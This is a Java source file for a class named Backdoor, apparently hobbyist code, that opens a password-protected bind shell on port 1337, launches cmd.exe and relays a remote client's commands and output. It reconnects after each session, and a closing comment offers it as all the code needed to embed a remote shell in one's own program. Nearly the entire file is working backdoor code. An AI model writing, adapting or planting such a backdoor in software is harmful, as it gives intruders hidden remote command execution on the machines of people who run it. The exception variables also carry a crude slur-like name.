package test_code;

import java.io.*;
import java.net.*;

class Backdoor extends Thread {
	
	private ServerSocket listener;						//ServerSocket object for listening
	private BufferedReader inStream;					//BufferedReader to read input from client
	private PrintWriter outStream;						//PrintWriter to write output to client
	private Socket mainSocket;							//Socket to handle client-server communication
	private int port;									//Port the server listens on
	private String name;								//The server name
	private String password;							//The server password
	private boolean verbose = true;						//Displays messages in console if True
	private Runtime rt;									//Runtime to execute shell commands
	private Process shell;								//The shell process
	private BufferedWriter toShell;						//Sends commands to shell
	private BufferedReader fromShell;					//Reads output from the shell
	private Thread shellThread;							//So we can destroy the Thread when the client disconnects
	
	private static int DEFAULT_PORT = 1337;				//Default port to listen on if one isn't declared
	private static String DEFAULT_NAME = "Server";		//Default name of server if one isn't declared
	private static String DEFAULT_PASS = "password";	//Default server password if one isn't declared
	
	public Backdoor() {									//Use default settings
		port = DEFAULT_PORT;
		name = DEFAULT_NAME;
		password = DEFAULT_PASS;
	}
	
	public Backdoor(int p) {							//Define port only
		port = p;
		name = DEFAULT_NAME;
		password = DEFAULT_PASS;
	}
	
	public Backdoor(int p, String n) {					//Define port and server name
		port = p;
		name = n;
		password = DEFAULT_PASS;
	}
	
	public Backdoor(int p, String n, String pass) {		//Define port, server name, and password
		port = p;
		name = n;
		password = pass;
	}
	////////////////////////////////////////////////////////////////////////
	//the startServer method waits for a connection, checks the password,
	//and either drops the client or starts a remote shell
	////////////////////////////////////////////////////////////////////////
	public void startServer() {
		try {
			if(verbose)
				System.out.println("Listening on port " + 1337);
			
			listener = new ServerSocket(port);														//Create the ServerSocket
			mainSocket = listener.accept();															//Stop and wait for a connection
			
			if(verbose)
				System.out.println("Client connected: " + mainSocket.getInetAddress());
			
			inStream = new BufferedReader(new InputStreamReader(mainSocket.getInputStream()));		//Client connected! prepare for input
			outStream = new PrintWriter(mainSocket.getOutputStream());								//and output
			String checkPass = inStream.readLine();													//Wait for a password
			
			if(verbose)
				System.out.println("Client tried password " + checkPass);
			
			if(!checkPass.equals(password)) {														//If the password is not correct
				if(verbose)
					System.out.println("Incorrect Password");
				dropConnection();																	//Drop the client
			}
			
			if(verbose)
				System.out.println("Password Accepted.");
			
			//new Thread(this).start(); 
			rt = Runtime.getRuntime();																//Get Runtime required to open the shell
			shell = rt.exec("cmd.exe");																//Start the shell (cmd.exe)
			toShell = new BufferedWriter(new OutputStreamWriter(shell.getOutputStream()));			//Open a stream to send commands to the shell
			fromShell = new BufferedReader(new InputStreamReader(shell.getInputStream()));			//Opens a stream to read output from the shell
			(shellThread = new Thread(this)).start();												//Start a thread to read output from the shell
			println("Welcome to " + name + " backdoor server.");									//Display a welcome message to the client
			println("Starting shell...\n");
			getInput();																				//Prepare to monitor client input...
			dropConnection();																		//When everything fails the program will come back here
						
		}
		catch(Exception gay) {
			if(verbose)
				System.out.println("Error Listening: " + gay);
			dropConnection();
		}
	}
	////////////////////////////////////////////////////////////////////////////////////
	//Print and println methods just to make sending messages to the client easier
	private void print(String text) {
		outStream.print(text);
		outStream.flush();
	}
	
	private void println(String text) {
		outStream.println(text);
		outStream.flush();
	}
	////////////////////////////////////////////////////////////////////////////////////
	
	//////////////////////////////////////////////////////////////////////////////////////////////
	//The run method handles shell output in a seperate thread
	//////////////////////////////////////////////////////////////////////////////////////////////
	
	public void run() {
		try {
    		String tempBuf = "";
    		outStream.println("\r\n");
    		while((tempBuf = fromShell.readLine()) != null) {
    			outStream.write(tempBuf + "\r\n");
    			outStream.flush();
    		}
    		dropConnection();
    	}
    	catch(Exception gay) { dropConnection(); }
	}
	
	private void getInput() {
		try {
			String tempBuff = "";														//Prepare a string to hold client commands
			while(((tempBuff = inStream.readLine()) != null)) {							//While the buffer is not null
				if(verbose)
					System.out.println("Received command: " + tempBuff);
				handleCommand(tempBuff);												//Handle the client's commands
			}
		}
		catch(Exception gay) {
			if(verbose)
				System.out.println("Thread Error: " + gay);
		}
	}
	
	private void handleCommand(String com) {											//Here we can catch commands before they are sent
		try {																			//to the shell, so we could write our own if we want
			if(com.equalsIgnoreCase("exit")) {											//In this case I catch the 'exit' command and use it
				println("\n\nClosing the shell and Dropping the connection...");
				shell.destroy();														//To kill the process
				dropConnection();														//And drop the connection
			}
			toShell.write(com + "\r\n");
			toShell.flush();
		}
		catch(Exception gay) {
			if(verbose)
				System.out.println("Command Error: " + gay);
			dropConnection();
		}
	}
	
	////////////////////////////////////////////////////////////////////
	//The drop connection method closes all connections and
	//resets the objects to their null states to be created again
	//I don't know if this is the best way to do it but it seems to
	//work without issue.
	////////////////////////////////////////////////////////////////////
	private void dropConnection() {
		try {
			if(verbose)
				System.out.println("Dropping Connection");
			inStream.close();									//Close everything...
			outStream.close();				
			mainSocket.close();
			listener.close();
			toShell.close();
			fromShell.close();
			//shellThread.destroy();
			inStream = null;
			outStream = null;
			mainSocket = null;
			listener = null;
			shell = null;
			rt = null;
			toShell = null;
			shellThread = null;
			startServer();										//And start listening again
		}
		catch(Exception gay) {
			if(verbose)
				System.out.println("Error: " + gay);
		}
	}
	
	//////////////////////////////////////////////////////////
	//The main method sets up a backdoor server on port 1337
	//with the password "thisIsAPassword" (Case Sensitive)
	//This is all the code you need to run a remote shell
	//from a program you write yourself.
	//////////////////////////////////////////////////////////
	public static void main(String[] args) {
		
		new Backdoor(1337, "DarkTussin", "thisIsAPassword").startServer();
	}
}
